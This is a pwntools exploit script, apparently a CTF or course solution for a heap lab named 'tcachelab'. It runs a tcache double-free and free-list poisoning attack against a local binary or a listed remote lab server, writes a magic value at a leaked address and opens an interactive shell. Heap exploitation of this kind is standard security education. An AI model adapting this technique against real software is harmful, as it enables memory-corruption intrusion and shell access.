from pwn import *

localhost = True

if localhost:
    server = process('./sourcecode/tcachelab')
else:
    server = remote('140.112.31.97', 30106)
    
server.recvuntil('Lock address : 0x')
target_address = int(server.recvline()[:-1], 16)

def create(size, owner, uuid, data):
    server.sendlineafter('Choice >', '1')
    server.sendlineafter('Note size :', str(size))
    server.sendlineafter('Owner :', owner)
    server.sendlineafter('UUID :', uuid)
    server.sendlineafter('Content :', data)
    
def edit(index, uuid, data):
    server.sendlineafter('Choice >', '2')
    server.sendlineafter('Note index :', str(index))
    server.sendlineafter('UUID :', uuid)
    server.sendlineafter('Content :', data)
    
def delete(index):
    server.sendlineafter('Choice >', '3')
    server.sendlineafter('Note index :', str(index))

#double free and padding list
create(0x10, '0', '0', '0')
delete(0)
edit(0, '0', '0')
delete(0)
edit(0, '0', '0')
delete(0)

#write address
create(0x10, p64(target_address - 0x18), '0', '0')

#write payload
create(0x10, '0', '0', '0')
create(0x10, '0', '0', p64(0xcafedeadbeefcafe))

#backdoor
server.sendlineafter('Choice >', '4')

#shell
server.interactive()